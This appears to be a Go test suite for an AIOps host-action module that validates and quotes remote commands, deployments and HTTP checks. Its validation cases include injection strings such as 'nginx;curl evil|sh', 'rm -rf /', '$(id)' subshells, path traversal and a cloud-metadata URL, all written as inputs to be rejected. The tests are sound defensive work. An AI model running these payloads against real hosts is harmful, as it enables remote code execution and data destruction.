package aiops

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"strings"
	"testing"

	"github.com/yangguangdijia/xingshu-matrix/server/internal/app"
	"github.com/yangguangdijia/xingshu-matrix/server/internal/rbac"
)

// hostFakeExec is a RemoteExecProvider recording every command.
type hostFakeExec struct {
	reqs    []app.RemoteExecRequest
	respond func(req app.RemoteExecRequest) (app.RemoteExecResult, error)
	assets  map[int64]app.AssetRef
}

func (f *hostFakeExec) RemoteExec(_ context.Context, _ *rbac.Principal, req app.RemoteExecRequest) (app.RemoteExecResult, error) {
	f.reqs = append(f.reqs, req)
	if f.respond != nil {
		return f.respond(req)
	}
	return app.RemoteExecResult{Output: "ok", SessionID: "s1"}, nil
}
func (f *hostFakeExec) OnboardAsset(context.Context, *rbac.Principal, app.AssetOnboardRequest) (app.AssetRef, error) {
	return app.AssetRef{}, errors.New("not used")
}
func (f *hostFakeExec) ResolveAsset(_ context.Context, _ *rbac.Principal, id int64) (app.AssetRef, error) {
	if a, ok := f.assets[id]; ok {
		return a, nil
	}
	return app.AssetRef{}, fmt.Errorf("asset %d not found", id)
}

func hostNewFake() *hostFakeExec {
	return &hostFakeExec{assets: map[int64]app.AssetRef{
		1: {AssetID: 1, Name: "web-1", Env: "test"},
		2: {AssetID: 2, Name: "db-prod", Env: "prod"},
	}}
}

func hostEC(f *hostFakeExec, env string) *ExecContext {
	d := &app.Deps{}
	if f != nil {
		d.RemoteExec = f
	}
	return &ExecContext{Deps: d, Principal: &rbac.Principal{UserID: 7, Username: "ops"}, Case: &Case{ID: 12}, Env: env}
}

func TestHostActionsRegistered(t *testing.T) {
	want := map[string]string{
		"host.probe": RiskRead, "host.check_port": RiskRead, "host.http_check": RiskRead,
		"host.service": RiskChange, "host.exec": RiskHigh, "host.deploy": RiskChange,
	}
	for name, risk := range want {
		a, ok := ActionByName(name)
		if !ok {
			t.Fatalf("%s not registered", name)
		}
		sp := a.Spec()
		if sp.Name != name || sp.Risk != risk || sp.Title == "" || !json.Valid(sp.Params) {
			t.Fatalf("bad spec for %s: %+v", name, sp)
		}
	}
}

func TestHostValidate(t *testing.T) {
	f := hostNewFake()
	cases := []struct {
		name, action, env, params string
		risk                      string // expected risk when valid
		errSub                    string // non-empty: expect error containing it
	}{
		{"probe ok", "host.probe", "test", `{"asset_id":1}`, RiskRead, ""},
		{"probe missing asset", "host.probe", "test", `{}`, "", "asset_id"},
		{"probe unknown asset", "host.probe", "test", `{"asset_id":99}`, "", "不可用"},
		{"probe unknown field", "host.probe", "test", `{"asset_id":1,"cmd":"id"}`, "", "参数格式错误"},
		{"port ok", "host.check_port", "test", `{"asset_id":1,"port":80}`, RiskRead, ""},
		{"port range", "host.check_port", "test", `{"asset_id":1,"port":70000}`, "", "1-65535"},
		{"port host injection", "host.check_port", "test", `{"asset_id":1,"port":80,"host":"127.0.0.1;reboot"}`, "", "host 不合法"},
		{"port host subshell", "host.check_port", "test", `{"asset_id":1,"port":80,"host":"$(id)"}`, "", "host 不合法"},
		{"port string port", "host.check_port", "test", `{"asset_id":1,"port":"80;id"}`, "", "参数格式错误"},
		{"service ok", "host.service", "test", `{"asset_id":1,"name":"nginx","op":"restart"}`, RiskChange, ""},
		{"service status is read", "host.service", "test", `{"asset_id":1,"name":"nginx.service","op":"status"}`, RiskRead, ""},
		{"service prod env -> high", "host.service", "prod", `{"asset_id":1,"name":"nginx","op":"restart"}`, RiskHigh, ""},
		{"service prod asset -> high", "host.service", "test", `{"asset_id":2,"name":"mysqld","op":"stop"}`, RiskHigh, ""},
		{"service semicolon", "host.service", "test", `{"asset_id":1,"name":"nginx; rm -rf /","op":"restart"}`, "", "服务名不合法"},
		{"service backtick", "host.service", "test", "{\"asset_id\":1,\"name\":\"`id`\",\"op\":\"start\"}", "", "服务名不合法"},
		{"service subshell", "host.service", "test", `{"asset_id":1,"name":"$(reboot)","op":"start"}`, "", "服务名不合法"},
		{"service option injection", "host.service", "test", `{"asset_id":1,"name":"-H evil","op":"start"}`, "", "服务名不合法"},
		{"service newline", "host.service", "test", `{"asset_id":1,"name":"nginx\nreboot","op":"start"}`, "", "服务名不合法"},
		{"service bad op", "host.service", "test", `{"asset_id":1,"name":"nginx","op":"mask"}`, "", "op 只能是"},
		{"exec ok high", "host.exec", "test", `{"asset_id":1,"command":"journalctl -u nginx -n 50"}`, RiskHigh, ""},
		{"exec empty", "host.exec", "test", `{"asset_id":1,"command":"  "}`, "", "不能为空"},
		{"exec too long", "host.exec", "test", `{"asset_id":1,"command":"` + strings.Repeat("a", 5000) + `"}`, "", "不能超过"},
		{"deploy run ok", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web","image":"registry.example.com:5000/team/nginx:1.25-alpine","ports":["8080:80","127.0.0.1:9113:9113/tcp"],"env":{"TZ":"Asia/Shanghai"},"volumes":["/data/web:/usr/share/nginx/html:ro","webcache:/cache"]}`, RiskChange, ""},
		{"deploy digest ok", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web","image":"nginx@sha256:` + strings.Repeat("a", 64) + `"}`, RiskChange, ""},
		{"deploy prod -> high", "host.deploy", "production", `{"asset_id":1,"mode":"run","name":"web","image":"nginx"}`, RiskHigh, ""},
		{"deploy image injection", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web","image":"nginx;curl evil|sh"}`, "", "镜像名不合法"},
		{"deploy image and", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web","image":"nginx:latest && rm -rf /"}`, "", "镜像名不合法"},
		{"deploy image option", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web","image":"--privileged"}`, "", "镜像名不合法"},
		{"deploy name injection", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web$(id)","image":"nginx"}`, "", "容器名不合法"},
		{"deploy port injection", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web","image":"nginx","ports":["80:80; id"]}`, "", "端口映射不合法"},
		{"deploy env key injection", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web","image":"nginx","env":{"A;id":"1"}}`, "", "环境变量名不合法"},
		{"deploy env value newline", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web","image":"nginx","env":{"A":"1\nreboot"}}`, "", "换行"},
		{"deploy volume traversal", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web","image":"nginx","volumes":["/data/../etc:/x"]}`, "", "挂载不合法"},
		{"deploy volume injection", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web","image":"nginx","volumes":["/:/host;id"]}`, "", "挂载不合法"},
		{"deploy bad restart", "host.deploy", "test", `{"asset_id":1,"mode":"run","name":"web","image":"nginx","restart":"always;id"}`, "", "restart"},
		{"deploy compose ok", "host.deploy", "test", `{"asset_id":1,"mode":"compose","project_dir":"/opt/app","compose_content":"services:\n  web:\n    image: nginx\n","pull":true}`, RiskChange, ""},
		{"deploy compose dir traversal", "host.deploy", "test", `{"asset_id":1,"mode":"compose","project_dir":"/opt/../etc"}`, "", "project_dir"},
		{"deploy compose dir injection", "host.deploy", "test", `{"asset_id":1,"mode":"compose","project_dir":"/opt/app;id"}`, "", "project_dir"},
		{"deploy compose file injection", "host.deploy", "test", `{"asset_id":1,"mode":"compose","project_dir":"/opt/app","file":"a.yml;id"}`, "", "compose 文件名不合法"},
		{"deploy compose mixed", "host.deploy", "test", `{"asset_id":1,"mode":"compose","project_dir":"/opt/app","image":"nginx"}`, "", "mode=compose"},
		{"deploy bad mode", "host.deploy", "test", `{"asset_id":1,"mode":"k8s"}`, "", "mode 只能是"},
		{"http ok", "host.http_check", "prod", `{"url":"http://10.0.0.5:8080/health"}`, RiskRead, ""},
		{"http bad scheme", "host.http_check", "test", `{"url":"file:///etc/passwd"}`, "", "http://"},
		{"http userinfo", "host.http_check", "test", `{"url":"http://u:p@10.0.0.5/"}`, "", "账号密码"},
		{"http metadata", "host.http_check", "test", `{"url":"http://169.254.169.254/latest/meta-data"}`, "", "链路本地"},
		{"http bad method", "host.http_check", "test", `{"url":"http://a.example.com","method":"POST"}`, "", "GET 或 HEAD"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			a, _ := ActionByName(c.action)
			norm, risk, err := a.Validate(context.Background(), hostEC(f, c.env), json.RawMessage(c.params))
			if c.errSub != "" {
				if err == nil || !strings.Contains(err.Error(), c.errSub) {
					t.Fatalf("want error containing %q, got %v", c.errSub, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if risk != c.risk {
				t.Fatalf("risk = %s, want %s", risk, c.risk)
			}
			if _, _, _, err := a.Describe(context.Background(), hostEC(f, c.env), norm); err != nil {
				t.Fatalf("describe: %v", err)
			}
		})
	}
	if len(f.reqs) != 0 {
		t.Fatalf("validate/describe must not execute anything, got %d", len(f.reqs))
	}
}

func TestHostShellQuoteResistsInjection(t *testing.T) {
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no sh")
	}
	evil := []string{`x'; touch /tmp/pwned #`, "$(id)", "`id`", `a"b'c\d`, "; rm -rf / ;", "'", "''", `$HOME && echo hi`}
	for _, e := range evil {
		out, err := exec.Command(sh, "-c", "printf %s "+hostShellQuote(e)).Output()
		if err != nil {
			t.Fatalf("%q: %v", e, err)
		}
		if string(out) != e {
			t.Fatalf("quoted %q came back as %q", e, out)
		}
	}
}

func TestHostDeployCommandQuotesValues(t *testing.T) {
	a, _ := ActionByName("host.deploy")
	f := hostNewFake()
	params := `{"asset_id":1,"mode":"run","name":"web","image":"nginx:1.25","env":{"GREETING":"x'; reboot #","DB_PASSWORD":"Sup3r$ecret"},"args":["--conf","$(id)"]}`
	norm, _, err := a.Validate(context.Background(), hostEC(f, "test"), json.RawMessage(params))
	if err != nil {
		t.Fatal(err)
	}
	_, preview, manual, err := a.Describe(context.Background(), hostEC(f, "test"), norm)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(preview, "Sup3r$ecret") || strings.Contains(manual, "Sup3r$ecret") {
		t.Fatalf("secret env value shown in preview/manual:\n%s\n%s", preview, manual)
	}
	if _, err := a.Execute(context.Background(), hostEC(f, "test"), norm); err != nil {
		t.Fatal(err)
	}
	cmd := f.reqs[0].Command
	for _, want := range []string{`-e 'GREETING=x'\''; reboot #'`, `'$(id)'`, "docker pull 'nginx:1.25'", "docker rename 'web' 'web.aiops-prev'"} {
		if !strings.Contains(cmd, want) {
			t.Fatalf("command missing %q:\n%s", want, cmd)
		}
	}
	if f.reqs[0].Reason != "aiops case #12 host.deploy" || f.reqs[0].AssetID != 1 {
		t.Fatalf("bad request %+v", f.reqs[0])
	}
}

func TestHostExecuteWithoutBastion(t *testing.T) {
	for _, name := range []string{"host.probe", "host.check_port", "host.service", "host.exec", "host.deploy"} {
		a, _ := ActionByName(name)
		params := map[string]string{
			"host.probe":      `{"asset_id":1}`,
			"host.check_port": `{"asset_id":1,"port":22}`,
			"host.service":    `{"asset_id":1,"name":"nginx","op":"restart"}`,
			"host.exec":       `{"asset_id":1,"command":"id"}`,
			"host.deploy":     `{"asset_id":1,"mode":"run","name":"web","image":"nginx"}`,
		}[name]
		if _, _, err := a.Validate(context.Background(), hostEC(nil, "test"), json.RawMessage(params)); err != nil {
			t.Fatalf("%s validate without bastion: %v", name, err)
		}
		_, err := a.Execute(context.Background(), hostEC(nil, "test"), json.RawMessage(params))
		if err == nil || err.Error() != "堡垒机远程执行未启用" {
			t.Fatalf("%s: want 堡垒机远程执行未启用, got %v", name, err)
		}
	}
	// nil Deps entirely
	a, _ := ActionByName("host.probe")
	if _, err := a.Execute(context.Background(), &ExecContext{}, json.RawMessage(`{"asset_id":1}`)); err == nil || err.Error() != "堡垒机远程执行未启用" {
		t.Fatalf("nil deps: %v", err)
	}
}

func TestHostExecuteResults(t *testing.T) {
	ctx := context.Background()
	t.Run("probe masks secrets in output", func(t *testing.T) {
		f := hostNewFake()
		f.respond = func(app.RemoteExecRequest) (app.RemoteExecResult, error) {
			return app.RemoteExecResult{Output: "Linux web-1\nDB_PASSWORD=abc123\n"}, nil
		}
		a, _ := ActionByName("host.probe")
		out, err := a.Execute(ctx, hostEC(f, "test"), json.RawMessage(`{"asset_id":1}`))
		if err != nil || strings.Contains(out, "abc123") || !strings.Contains(out, "Linux web-1") {
			t.Fatalf("out=%q err=%v", out, err)
		}
		if !strings.Contains(f.reqs[0].Command, "uname -a") || !strings.Contains(f.reqs[0].Command, "df -hP") {
			t.Fatalf("probe command: %s", f.reqs[0].Command)
		}
	})
	t.Run("blocked by command filter", func(t *testing.T) {
		f := hostNewFake()
		f.respond = func(app.RemoteExecRequest) (app.RemoteExecResult, error) {
			return app.RemoteExecResult{Blocked: "rm -rf 被禁止", ExitCode: -1}, nil
		}
		a, _ := ActionByName("host.exec")
		_, err := a.Execute(ctx, hostEC(f, "test"), json.RawMessage(`{"asset_id":1,"command":"rm -rf /"}`))
		if err == nil || !strings.Contains(err.Error(), "命令过滤拦截") {
			t.Fatalf("err=%v", err)
		}
	})
	t.Run("non-zero exit", func(t *testing.T) {
		f := hostNewFake()
		f.respond = func(app.RemoteExecRequest) (app.RemoteExecResult, error) {
			return app.RemoteExecResult{ExitCode: 5, Output: "Job for nginx.service failed"}, nil
		}
		a, _ := ActionByName("host.service")
		out, err := a.Execute(ctx, hostEC(f, "test"), json.RawMessage(`{"asset_id":1,"name":"nginx","op":"restart"}`))
		if err == nil || !strings.Contains(err.Error(), "退出码 5") || !strings.Contains(out, "failed") {
			t.Fatalf("out=%q err=%v", out, err)
		}
	})
	t.Run("check_port expect", func(t *testing.T) {
		f := hostNewFake()
		f.respond = func(app.RemoteExecRequest) (app.RemoteExecResult, error) {
			return app.RemoteExecResult{Output: "PORT_CLOSED"}, nil
		}
		a, _ := ActionByName("host.check_port")
		if _, err := a.Execute(ctx, hostEC(f, "test"), json.RawMessage(`{"asset_id":1,"port":80,"expect":"open"}`)); err == nil {
			t.Fatal("want failure when port closed but expected open")
		}
		if _, err := a.Execute(ctx, hostEC(f, "test"), json.RawMessage(`{"asset_id":1,"port":80}`)); err != nil {
			t.Fatalf("report-only should succeed: %v", err)
		}
		if !strings.Contains(f.reqs[0].Command, "'exec 3<>/dev/tcp/127.0.0.1/80'") {
			t.Fatalf("command: %s", f.reqs[0].Command)
		}
	})
}

func TestHostServiceRollback(t *testing.T) {
	ctx := context.Background()
	a, _ := ActionByName("host.service")
	cases := []struct {
		name, op, prevOut, wantCmd string
		noRollback                 bool
	}{
		{"stop was active -> start", "stop", "__AIOPS_PREV_STATE__=active\nactive=inactive", "systemctl start -- 'nginx'", false},
		{"start was inactive -> stop", "start", "__AIOPS_PREV_STATE__=inactive\nactive=active", "systemctl stop -- 'nginx'", false},
		{"restart was failed -> stop", "restart", "__AIOPS_PREV_STATE__=failed", "systemctl stop -- 'nginx'", false},
		{"restart was active -> start", "restart", "__AIOPS_PREV_STATE__=active", "systemctl start -- 'nginx'", false},
		{"no marker", "restart", "something else", "", true},
		{"unknown state", "start", "__AIOPS_PREV_STATE__=unknown", "", true},
		{"status never rolls back", "status", "__AIOPS_PREV_STATE__=active", "", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := hostNewFake()
			params := json.RawMessage(fmt.Sprintf(`{"asset_id":1,"name":"nginx","op":%q}`, c.op))
			_, err := a.Rollback(ctx, hostEC(f, "test"), params, c.prevOut)
			if c.noRollback {
				if !errors.Is(err, ErrNoRollback) || len(f.reqs) != 0 {
					t.Fatalf("want ErrNoRollback without exec, got %v (%d reqs)", err, len(f.reqs))
				}
				return
			}
			if err != nil || len(f.reqs) != 1 || !strings.Contains(f.reqs[0].Command, c.wantCmd) {
				t.Fatalf("err=%v reqs=%+v", err, f.reqs)
			}
		})
	}
	// Execute records the previous state for rollback.
	f := hostNewFake()
	if _, err := a.Execute(ctx, hostEC(f, "test"), json.RawMessage(`{"asset_id":1,"name":"nginx","op":"stop"}`)); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(f.reqs[0].Command, hostMarkPrevState) || !strings.Contains(f.reqs[0].Command, "systemctl stop -- 'nginx'") {
		t.Fatalf("command: %s", f.reqs[0].Command)
	}
}

func TestHostDeployRollback(t *testing.T) {
	ctx := context.Background()
	a, _ := ActionByName("host.deploy")
	run := json.RawMessage(`{"asset_id":1,"mode":"run","name":"web","image":"nginx:1.27"}`)
	compose := json.RawMessage(`{"asset_id":1,"mode":"compose","project_dir":"/opt/app"}`)
	cases := []struct {
		name       string
		params     json.RawMessage
		execOut    string
		wantCmd    []string
		wantSum    string
		noRollback bool
	}{
		{"run with previous", run, "__AIOPS_PREV_IMAGE__=nginx:1.25\n__AIOPS_PREV_CONTAINER__=web.aiops-prev", []string{"docker rm -f 'web'", "docker rename 'web.aiops-prev' 'web'", "docker start 'web'"}, "nginx:1.25", false},
		{"run fresh", run, "abc123", []string{"docker rm -f 'web'"}, "部署前不存在", false},
		{"compose with backup", compose, "__AIOPS_COMPOSE_BACKUP__=docker-compose.yml.aiops-bak", []string{"cd '/opt/app'", `mv "$F.aiops-bak" "$F"`, "up -d"}, "恢复 compose 文件备份", false},
		{"compose fresh", compose, "__AIOPS_COMPOSE_FRESH__", []string{`-f "$F" down`}, "首次部署", false},
		{"compose unknown", compose, "", nil, "", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := hostNewFake()
			out, err := a.Rollback(ctx, hostEC(f, "test"), c.params, c.execOut)
			if c.noRollback {
				if !errors.Is(err, ErrNoRollback) {
					t.Fatalf("want ErrNoRollback, got %v", err)
				}
				return
			}
			if err != nil || len(f.reqs) != 1 {
				t.Fatalf("err=%v reqs=%d", err, len(f.reqs))
			}
			for _, w := range c.wantCmd {
				if !strings.Contains(f.reqs[0].Command, w) {
					t.Fatalf("rollback command missing %q:\n%s", w, f.reqs[0].Command)
				}
			}
			if !strings.Contains(out, c.wantSum) {
				t.Fatalf("summary %q missing %q", out, c.wantSum)
			}
		})
	}
	// compose execute writes content via base64 only (no raw YAML in the shell).
	f := hostNewFake()
	p := json.RawMessage(`{"asset_id":1,"mode":"compose","project_dir":"/opt/app","compose_content":"services:\n  web:\n    image: \"nginx'; reboot\"\n"}`)
	if _, err := a.Execute(ctx, hostEC(f, "test"), p); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(f.reqs[0].Command, "reboot") || !strings.Contains(f.reqs[0].Command, "base64 -d") || !strings.Contains(f.reqs[0].Command, hostMarkComposeBackup) {
		t.Fatalf("compose command: %s", f.reqs[0].Command)
	}
}

func TestHostHTTPCheck(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/health":
			fmt.Fprint(w, `{"status":"UP","token":"t0k3n"}`)
		default:
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprint(w, "boom")
		}
	}))
	defer srv.Close()
	a, _ := ActionByName("host.http_check")
	ctx := context.Background()
	cases := []struct {
		name, params string
		ok           bool
	}{
		{"200 default", `{"url":"` + srv.URL + `/health"}`, true},
		{"contains ok", `{"url":"` + srv.URL + `/health","contains":"UP"}`, true},
		{"contains missing", `{"url":"` + srv.URL + `/health","contains":"DOWN"}`, false},
		{"500 fails", `{"url":"` + srv.URL + `/x"}`, false},
		{"500 expected", `{"url":"` + srv.URL + `/x","expect_status":[500]}`, true},
		{"head", `{"url":"` + srv.URL + `/health","method":"head"}`, true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			norm, risk, err := a.Validate(ctx, hostEC(nil, "test"), json.RawMessage(c.params))
			if err != nil || risk != RiskRead {
				t.Fatalf("validate: %v %s", err, risk)
			}
			out, err := a.Execute(ctx, hostEC(nil, "test"), norm)
			if (err == nil) != c.ok {
				t.Fatalf("ok=%v err=%v out=%s", c.ok, err, out)
			}
			if strings.Contains(out, "t0k3n") {
				t.Fatalf("secret leaked in output: %s", out)
			}
		})
	}
}
